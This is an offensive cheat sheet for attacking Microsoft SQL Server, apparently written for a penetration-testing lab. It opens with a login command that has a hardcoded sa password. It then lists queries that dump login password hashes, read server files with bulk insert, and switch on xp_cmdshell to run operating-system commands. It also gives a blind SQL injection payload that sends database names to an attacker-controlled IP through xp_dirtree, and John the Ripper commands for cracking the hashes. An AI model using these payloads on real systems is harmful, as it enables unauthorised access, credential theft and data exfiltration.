```shell
sqsh -S 10.11.1.31 -U sa -P poiuytrewq -D Db
```

### Version
```SQL
Select @@version;
GO
```
### Show databases
```sql
SELECT name FROM sys.databases
GO
```

### Show tables
```sql
SELECT TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='master'
go

```

### Show Column names

```SQL
-- Method 1
EXEC SP_COLUMNS 'Orders'

-- Method 2
EXEC SP_HELP 'Sales.Orders'

-- Method 3
SELECT COLUMN_NAME, ORDINAL_POSITION, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Orders'

-- Method 4
SELECT NAME, COLUMN_ID FROM SYS.COLUMNS WHERE object_id = OBJECT_ID('Sales.Orders')
```

### List Password Hashes

```SQL


SELECT name, password FROM master..sysxlogins -- priv, mssql 2000;  

SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins -- priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.  

SELECT name, password_hash FROM master.sys.sql_logins -- priv, mssql 2005; 

SELECT name + ‘-‘ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins -- priv, mssql 2005
```

### Read File

```SQL
Create table mydata (line varchar(8000))
bulk insert mydata from 'C:\boot\ini';
GO
```

### CMD Execute 

```SQL
-- Command Execution
-- User must have ALTER SETTING Permission to change setting

EXEC xp_cmdshell 'net user'; -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:  
EXEC sp_configure 'show advanced options', 1; -- priv  
RECONFIGURE; -- priv  
EXEC sp_configure 'xp_cmdshell', 1; -- priv  
RECONFIGURE; -- priv
```


### Blind SQL Data Exfiltration.


**Detect

```sql
WAITFOR DELAY '00:00:10'
```

**Exfiltrate

```SQL
DECLARE @data varchar(2000); (set @data = '' ; SELECT  @data = @data + name + ',' FROM sys.databases ) ; EXEC('master..xp_dirtree "\\192.168.119.216\'+@data+'"') ; --
```



### Brute Force

**MS SQL 2000 - SHA1+sel+case sensitive + tt Maj**

```shell
john --format=mssql password.txt
```

**MS SQL 2005 - SHA1+sel+case sensitive**

```shell
john --format=mssql05 password.txt
```


**MS SQL 2012- SHA256+sel+case sensitive**

```shell
john --format=mssql12 password.txt
```
